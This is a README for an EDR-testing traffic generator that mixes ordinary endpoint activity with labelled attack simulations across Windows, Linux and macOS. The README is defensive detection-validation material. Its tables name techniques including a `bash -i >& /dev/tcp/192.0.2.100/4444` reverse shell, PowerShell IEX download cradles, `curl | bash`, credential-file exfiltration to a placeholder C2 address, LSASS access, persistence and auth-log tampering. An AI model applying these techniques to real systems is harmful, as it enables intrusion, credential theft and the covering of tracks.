# Endpoint Traffic Generator — Setup & Usage Guide

Simulates realistic endpoint activity for validating EDR detection coverage
(SentinelOne, CrowdStrike, or any agent-based EDR). Runs two categories of
activity on a configurable schedule:

- **Normal traffic** — web browsing, DNS lookups, file I/O, SMTP probes
- **Attack simulations** — clearly labeled `[TEST-ATTACK]` behaviors that
  mirror real attacker techniques: recon bursts, credential file access,
  encoded commands, persistence attempts, and more

Automatically detects the host OS at startup and loads only the attacks
relevant to that platform — no PowerShell on Linux, no bash cradles on Windows.

**Supported platforms:** Windows 10/11 · RHEL / CentOS / Rocky · Debian / Ubuntu / Kali · macOS

---

## What You Need

| Requirement | Notes |
|---|---|
| Python 3.7 or later | 3.13 is **not** recommended (library compatibility) |
| `traffic_generator.py` | The simulator script |
| Network access | Used for web browse and DNS simulation |
| No extra packages | All dependencies are Python standard library |

---

## Setup

### Windows

1. Download and install Python 3.11 from **python.org/downloads**.  
   Check **"Add python.exe to PATH"** during installation.

2. Open Command Prompt and verify:
   ```
   python --version
   ```

3. Run the script directly — no packages to install:
   ```
   python traffic_generator.py
   ```

### Linux (RHEL / CentOS / Debian / Kali / Ubuntu)

Most distributions ship with Python 3. Verify:

```bash
python3 --version
```

If missing, install it:

```bash
# RHEL / CentOS / Rocky
sudo dnf install python3

# Debian / Ubuntu / Kali
sudo apt install python3
```

Run the script:

```bash
python3 traffic_generator.py
```

### macOS

macOS ships with Python 3 via Xcode Command Line Tools. If needed:

```bash
xcode-select --install
```

Run the script:

```bash
python3 traffic_generator.py
```

---

## Quick Start

```bash
# Default: normal event every 30s, attack window every 5 min, 40% chance of attack
python3 traffic_generator.py

# Aggressive: attack every 2 min, guaranteed to fire
python3 traffic_generator.py --normal-interval 15 --attack-interval 120 --attack-prob 1.0

# Normal traffic only, no attack simulations
python3 traffic_generator.py --attack-prob 0

# Run for 1 hour and save logs to file
python3 traffic_generator.py --runtime 3600 --log-file sim.log
```

---

## All Options

| Option | Default | Description |
|---|---|---|
| `--normal-interval SEC` | `30` | Seconds between normal traffic events |
| `--attack-interval SEC` | `300` | Seconds between attack simulation windows |
| `--attack-prob 0-1` | `0.4` | Probability an attack fires each window (0 = never, 1 = always) |
| `--runtime SEC` | *(run forever)* | Stop automatically after this many seconds |
| `--beacon` | off | Enable background C2 beacon simulation |
| `--beacon-host IP` | `192.0.2.100` | Beacon target host (RFC 5737 reserved IP by default) |
| `--beacon-port PORT` | `4444` | Beacon target port |
| `--beacon-interval SEC` | `60` | Seconds between beacon check-ins |
| `--log-file PATH` | *(stdout only)* | Also write logs to this file |
| `--verbose` | — | Show DEBUG-level output |

---

## OS Detection

The script reads `/etc/os-release` on Linux to identify the distribution,
then prints the detected profile at startup:

```
OS profile      : rhel  (Linux-5.14.0-x86_64-with-glibc2.28)
Attack pool     : 27 actions
```

| Detected value | Covers |
|---|---|
| `windows` | Windows 10, 11, Server |
| `rhel` | RHEL, CentOS, Rocky Linux, AlmaLinux, Fedora |
| `debian` | Debian, Ubuntu, Kali Linux, Parrot OS, Mint |
| `macos` | macOS (any version) |
| `linux` | Any other Linux distribution |

---

## What It Simulates

### Normal Traffic (all platforms)

| Action | What it does |
|---|---|
| Web browse | HTTP GET to real news/reference sites with a browser User-Agent |
| DNS lookup | Resolves mail, CDN, and update hostnames |
| File I/O | Writes, reads, and deletes a temp document file |
| SMTP probe | EHLO handshake to smtp.gmail.com:587 — like an email client connecting |
| Local info | OS-appropriate system info commands (`hostname`, `uname`, `sw_vers`, `ver`) |

### Attack Simulations

All attack events are tagged `[TEST-ATTACK]` and logged at WARNING level
so they are easy to filter in a SIEM or log file.

#### Common to all platforms

| Simulation | Technique |
|---|---|
| EICAR drop | Writes the AV test string to a single temp location, waits 2s, deletes it |
| EICAR multi-drop | Drops EICAR simultaneously in all writable temp/user locations |
| Recon burst | Runs 2–4 enumeration commands directly — establishes baseline telemetry |
| Credential file stat | `os.path.exists()` checks on credential paths — low-noise existence check |
| Credential file read | Actually `open()`s credential files — generates file-read syscall EDRs log |
| Port scan (localhost) | Rapid SYN sweep of 20 random localhost ports |
| Subnet scan | SYN sweep of 10 neighbouring hosts on the local /24 — lateral movement recon (ports 22, 135, 139, 445, 3389, 5985) |
| External C2 connect | TCP connects to RFC 5737 reserved IPs on C2 ports — generates real outbound telemetry safely |
| DNS C2 domains | Resolves known sinkholed C2 domains (WannaCry kill switch, SolarWinds Sunburst) |
| DGA DNS burst | Queries 5–10 algorithmically generated random-looking domains — NXDOMAIN burst triggers DGA detection |
| Script-in-temp | Writes a `.bat` or `.sh` to the temp directory and executes it |

#### Windows only

| Simulation | Technique |
|---|---|
| CMD recon chain | 8 recon commands chained via `cmd.exe /c` — creates suspicious `python→cmd→tools` process tree |
| PowerShell encoded command | `powershell -EncodedCommand <base64>` — common obfuscation technique |
| PowerShell download cradle | `(New-Object Net.WebClient).DownloadString(url)` — stage-2 retrieval simulation |
| certutil LOLBAS | `certutil -urlcache -split -f` download — Living off the Land |
| mshta LOLBAS | `mshta.exe` executing inline VBScript — macro-less execution technique |
| wscript LOLBAS | VBScript written to temp and executed via `wscript.exe` |
| rundll32 LOLBAS | `rundll32.exe` JavaScript execution — Squiblydoo-style |
| Registry enumeration | Queries credential-adjacent keys (Winlogon, PuTTY sessions, OpenSSH, RDP history) |
| Registry persistence | Writes a Run key to `HKCU\...\Run`, waits 2s, deletes it |
| Scheduled task | `schtasks /create` then `/delete` — persistence attempt with cleanup |
| VSS / backup recon | `vssadmin list shadows`, `wbadmin get status`, `bcdedit /enum` — ransomware pre-stage pattern |
| LSASS handle request | `OpenProcess(PROCESS_ALL_ACCESS)` on the LSASS PID — credential dumping precursor |
| PowerShell IEX | `IEX (New-Object Net.WebClient).DownloadString(url)` — Invoke-Expression is the most-signatured PS technique |

#### RHEL / CentOS

| Simulation | Technique |
|---|---|
| Bash recon chain | `bash -c` chain including `/etc/shadow`, `/root`, `~/.ssh` attempts — creates suspicious `python→bash→tools` process tree |
| Bash encoded command | base64-encoded payload with credential access commands — `base64 -d \| bash` |
| curl\|bash cradle | Writes a shell script to `/tmp`, then `curl file:// \| bash` — real shell execution through the pipe (not JSON) |
| curl/wget download cradle | Downloads from a safe echo endpoint to simulate payload retrieval |
| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444` then Python socket fallback for systems without bash /dev/tcp |
| /etc/shadow read | Actually `open()`s `/etc/shadow` — generates credential-access telemetry |
| SUID binary search | `find /usr -perm -4000` — standard privilege escalation recon |
| sudo recon | `sudo -l` / `cat /etc/sudoers` — first-step privilege enumeration after shell access |
| Cron persistence | Writes a test crontab entry then removes it immediately |
| systemd persistence | Writes a user-level `.service` unit, enables it, disables it, removes it |
| ptrace attempt | `ptrace(PTRACE_ATTACH, 1)` on init/systemd — process injection precursor |
| Directory traversal | Lists `/etc`, `/var/log`, `/root`, `~/.ssh`, `/tmp` |
| /proc access | Opens `/proc/1/maps`, `/proc/1/cmdline`, `/proc/1/environ` — memory recon pattern |
| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 — uses the actual binary, much more detectable than raw sockets |
| Hidden payload exec | Writes a dotfile executable to `/tmp`, `chmod +x`, executes it — classic malware drop pattern |
| Credential exfil simulation | Read `/etc/passwd` + `/etc/shadow` attempt + `~/.ssh/id_rsa`, base64-encode, POST to RFC 5737 C2 IP — combined file+network signal |
| SSH key persistence | Appends a test key to `~/.ssh/authorized_keys`, waits 2s, removes it |
| Anti-forensics (log tamper) | Attempts to truncate `/var/log/auth.log` and `/var/log/secure`, then clears bash/zsh history |
| rpm -Va integrity check | Verifies package file integrity — used to find tampered binaries |
| yum/dnf package recon | Lists all installed packages via yum or dnf |

#### Debian / Kali

Same as RHEL, plus:

| Simulation | Technique |
|---|---|
| dpkg recon | Lists all installed packages via dpkg |
| Offensive tool probe | Checks for nmap, hydra, sqlmap, hashcat, gobuster, etc. |

#### macOS

| Simulation | Technique |
|---|---|
| Bash recon chain | `bash -c` chain with credential access attempts |
| Bash encoded command | base64-encoded payload with credential access — `base64 -d \| bash` |
| curl\|bash cradle | `curl file:// \| bash` — real shell execution through the pipe |
| curl download cradle | Simulates payload retrieval |
| Reverse shell simulation | `bash /dev/tcp` then Python socket fallback |
| SUID binary search | Scans `/usr` for setuid binaries |
| sudo recon | `sudo -l` / `cat /etc/sudoers` |
| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 |
| Directory traversal | Lists sensitive directories |
| Hidden payload exec | Dotfile executable in `/tmp`, chmod+x, execute |
| Credential exfil simulation | Read credential files, base64, POST to C2 IP |
| SSH key persistence | Write/remove test key in `~/.ssh/authorized_keys` |
| Anti-forensics | Truncate auth logs, wipe bash/zsh history |
| Keychain access | `security list-keychains` and `find-generic-password` |
| LaunchAgent persistence | Writes and loads a test `.plist`, then immediately unloads and deletes it |
| macOS-specific recon | `dscl`, `networksetup`, `system_profiler`, `defaults read` |
| TCC database access | Opens `~/Library/Application Support/com.apple.TCC/TCC.db` — app permission database |
| Gatekeeper recon | `spctl --status`, `codesign --verify`, `csrutil status` — security posture enumeration |
| osascript execution | AppleScript via `osascript` — used for persistence and privilege escalation |

---

## C2 Beacon

The `--beacon` flag starts a background thread that periodically attempts a TCP
connection to a target host — simulating a compromised endpoint checking in with
a C2 server on a regular interval.

```bash
# Beacon to the default RFC 5737 test IP every 60s
python3 traffic_generator.py --beacon

# Beacon to your own test server every 30s on port 8443
python3 traffic_generator.py --beacon --beacon-host 10.0.0.99 --beacon-port 8443 --beacon-interval 30
```

| Option | Default | Description |
|---|---|---|
| `--beacon` | off | Enable the beacon thread |
| `--beacon-host IP` | `192.0.2.100` | Target host (RFC 5737 reserved IP by default — never routed) |
| `--beacon-port PORT` | `4444` | Target port |
| `--beacon-interval SEC` | `60` | Seconds between check-ins |

The default target (`192.0.2.100`) is an RFC 5737 documentation address — it
will never route to a real host, but the connection *attempt* generates outbound
network telemetry that EDRs log. Point `--beacon-host` at your own test server
if you want to observe a successful connection.

---

## Reading the Logs

```
2026-05-18 12:22:44  INFO      [NORMAL] Web browse → https://www.bbc.com
2026-05-18 12:22:48  INFO      [NORMAL]  ← 52411 bytes
2026-05-18 12:22:52  WARNING   ------------------------------------------------------------
2026-05-18 12:22:52  WARNING     ATTACK SIMULATION — attack_recon_commands
2026-05-18 12:22:52  WARNING   ------------------------------------------------------------
2026-05-18 12:22:52  WARNING   [TEST-ATTACK] Recon burst (3 commands) — post-exploitation enum
2026-05-18 12:22:52  WARNING   [TEST-ATTACK]  exec: id
2026-05-18 12:22:52  WARNING   [TEST-ATTACK]  rc=0  out=uid=1000(user) gid=1000(user) groups=...
```

- `[NORMAL]` lines are INFO level — routine background activity
- `[TEST-ATTACK]` lines are WARNING level — attack simulation events
- Attack windows are separated by a dashed divider and include the function name

To filter only attack events:

```bash
grep "TEST-ATTACK" sim.log
```

---

## End-of-Run Attack Summary

When the generator stops — either via `Ctrl+C` or when `--runtime` expires —
it prints a formatted attack summary showing every attack that fired, its
timestamp, and whether any EDR impediment signals were detected.

```
================================================================================
  END-OF-RUN ATTACK SUMMARY
================================================================================
  Run time : 00:18:42  |  Attacks fired : 7
--------------------------------------------------------------------------------
  TIME      ATTACK                                     IMPEDED?   NOTES
  --------------------------------------------------------------------------
  12:23:01  attack_eicar_drop                          YES <<<    EICAR file deleted by AV/EDR before script cleanup
  12:25:44  attack_recon_commands                      no
  12:28:11  attack_credential_read                     no
  12:30:57  attack_bash_chain                          no
  12:33:22  attack_reverse_shell_sim                   YES <<<    subprocess killed (SIGKILL): bash
  12:36:05  attack_dga_dns                             no
  12:38:49  attack_port_scan_localhost                 no

  PASSIVE ATTACKS — low EDR signal, consider removing from rotation:
  --------------------------------------------------------------------------
  attack_port_scan_localhost                loopback only — no lateral movement signal
================================================================================
```

### What counts as "impeded"

| Signal | What triggered it |
|---|---|
| `EICAR file deleted by AV/EDR` | EICAR file disappeared before the script's own cleanup — agent deleted it |
| `subprocess killed (SIGKILL)` | A subprocess returned `rc=-9` — process was terminated by the agent |

### Passive attack notes

Attacks flagged as passive are low-signal by design. They rarely trigger alerts
on their own but contribute to behavioral correlation. The summary lists any that
fired so you can decide whether to keep them based on your environment.

| Attack | Why it's passive |
|---|---|
| `attack_credential_file_access` | Uses `os.path.exists()` — no file-read syscall |
| `attack_port_scan_localhost` | Loopback only — no lateral movement signal |
| `attack_sensitive_dir_traversal` | Plain `ls` — no access violation |
| `attack_windows_registry_enum` | Read-only `reg query` — no write event |
| `attack_rpm_verify` | Package integrity check — passive enumeration |
| `attack_yum_recon` | `dnf/yum list` — passive package enumeration |
| `attack_dpkg_recon` | `dpkg -l` — passive package enumeration |
| `attack_gatekeeper_recon` | `spctl/csrutil` queries — read-only status checks |
| `attack_macos_recon` | Info-gathering commands — no access violation |

The summary is also written to `--log-file` if one is configured.

---

## Tuning for Your Environment

**Light background noise, rare attacks** (default — blends in, tests passive detection):
```bash
python3 traffic_generator.py --normal-interval 30 --attack-interval 300 --attack-prob 0.4
```

**Moderate load, frequent attacks** (active detection testing):
```bash
python3 traffic_generator.py --normal-interval 20 --attack-interval 120 --attack-prob 0.7
```

**Attack-heavy with beacon** (stress-test detection rules, guaranteed fire, C2 simulation):
```bash
python3 traffic_generator.py --normal-interval 15 --attack-interval 60 --attack-prob 1.0 --beacon
```

**Normal traffic only** (baseline telemetry, no detections expected):
```bash
python3 traffic_generator.py --attack-prob 0
```

---

## Detection Confidence by OS

Not all attacks are equally likely to trigger an alert. This table reflects
expected behaviour on default EDR policies — tuned environments will catch more.

### Windows

| Attack | Confidence | Notes |
|---|---|---|
| EICAR drop / multi-drop | High | Triggers if real-time protection is on |
| PowerShell IEX | High | Most-signatured PS technique |
| PowerShell encoded command | High | First-class detection rule on both S1 and CRWD |
| LSASS handle request | High | Even a denied attempt registers as credential access |
| VSS / backup recon | High | Exact ransomware pre-stage pattern |
| CMD recon chain | High | Suspicious process tree triggers behavioral AI |
| Registry / scheduled task persistence | High | Write-then-delete still fires the creation event |
| LOLBAS (mshta, wscript, rundll32, certutil) | Medium–High | Depends on LOLBin policy |
| External C2 connections | Medium | Requires network visibility add-on |
| DGA DNS burst | Medium | Requires DNS monitoring to be enabled |

### RHEL / CentOS

| Attack | Confidence | Notes |
|---|---|---|
| EICAR drop / multi-drop | High | |
| `curl \| bash` | High | First-class detection rule on both S1 and CRWD |
| Reverse shell simulation | High | `bash /dev/tcp` pattern is heavily signatured |
| `/etc/shadow` read | High | Credential access event even on `PermissionError` |
| DGA DNS burst | High | Rapid NXDOMAIN pattern |
| DNS C2 domains | High | Known-bad domain reputation |
| Bash encoded command | Medium–High | |
| systemd persistence | Medium–High | |
| Bash recon chain | Medium | Suspicious process tree |
| External C2 connections | Medium | Requires network visibility |
| ptrace attempt | Medium | Requires audit/eBPF visibility |
| nmap subnet scan | Medium | **Only fires if nmap is installed** — not present by default on CentOS; install with `sudo dnf install nmap` |
| `/proc/1` access | Medium | Requires file-access monitoring |
| sudo recon | Low–Medium | Low signal alone; stronger in combination |
| Hidden payload exec | High | Dotfile drop + chmod+x + exec is a classic malware IOA |
| Credential exfil simulation | High | Combined file-read + outbound POST = multi-stage chain |
| SSH key persistence | High | Writing to authorized_keys is a first-class persistence IOA |
| Anti-forensics (log tamper) | High | Log truncation + history wipe = strong post-compromise indicator |

### Kali / Debian / Ubuntu

Same as RHEL/CentOS, plus:

| Attack | Confidence | Notes |
|---|---|---|
| Offensive tool probe | Medium | Kali will have most tools present — their detection as installed is itself a signal |
| nmap subnet scan | Medium–High | nmap is installed by default on Kali |

### macOS

| Attack | Confidence | Notes |
|---|---|---|
| EICAR drop / multi-drop | High | |
| `curl \| bash` | High | |
| Reverse shell simulation | High | |
| TCC database access | High | macOS-specific, strongly monitored |
| LaunchAgent persistence | High | |
| osascript execution | Medium–High | |
| Gatekeeper / SIP recon | Medium | |
| Keychain access | Medium | |

---

## Optional Dependencies

Most attacks use only Python standard library. Two attacks use external tools
if available and silently skip otherwise:

| Tool | Used by | Install |
|---|---|---|
| `nmap` | `attack_nmap_scan` | `sudo dnf install nmap` (RHEL/CentOS) · `sudo apt install nmap` (Debian/Kali) · included on Kali |
| `curl` | `attack_curl_pipe_bash`, `attack_curl_download_cradle` | Included on most distributions; `wget` used as fallback |

---

## Troubleshooting

**"command not found: python3"**  
Install Python 3 for your distribution (see Setup section above).

**Attack simulations fire but SentinelOne doesn't alert**  
Some attacks require specific policy settings to be enabled in the SentinelOne
console. Check that Detection and Prevention policies are active for the relevant
categories (Behavioral AI, Static AI, Indicators of Attack).

**EICAR drop doesn't trigger an alert**  
Ensure real-time protection is enabled in the SentinelOne agent. The EICAR
string must be written as a `.com` file — the script does this by default.

**cron persistence attempt shows `rc=127`**  
`crontab` is not installed or the user doesn't have permission. This is expected
on minimal container images; the script logs it as blocked and moves on.

**Script runs but no network events appear in SentinelOne**  
Network visibility may require the Full Visibility or Network Control add-on.
Check your license and agent configuration in the management console.

**Subnet scan or external C2 connections don't show up**  
The subnet scan targets hosts on your local /24 — if no hosts are in the
`x.x.x.1–49` range they'll all time out. External C2 connections use RFC 5737
addresses which are never routed, so the attempt is the signal, not a successful
connection. Both appear in the process's network telemetry regardless.

**LSASS access attempt shows access denied**  
That is the expected result on a hardened or agent-protected system. The
`OpenProcess` call itself is the detection trigger — the denial confirms the
agent is protecting LSASS correctly.

**ptrace attempt shows EPERM**  
Expected on any system with Yama LSM (`/proc/sys/kernel/yama/ptrace_scope` ≥ 1).
The attempt still generates an audit event.

**nmap scan skipped on CentOS / RHEL**  
`nmap` is not installed by default. Install it with `sudo dnf install nmap` to
enable the subnet scan attack. On Kali it is pre-installed and fires automatically.

**curl|bash or reverse shell sim hangs briefly then continues**  
Both attacks target RFC 5737 addresses (192.0.2.x) which are never routed — the
connection will time out after a few seconds. This is expected; the attempt is
what generates the telemetry, not a successful connection.
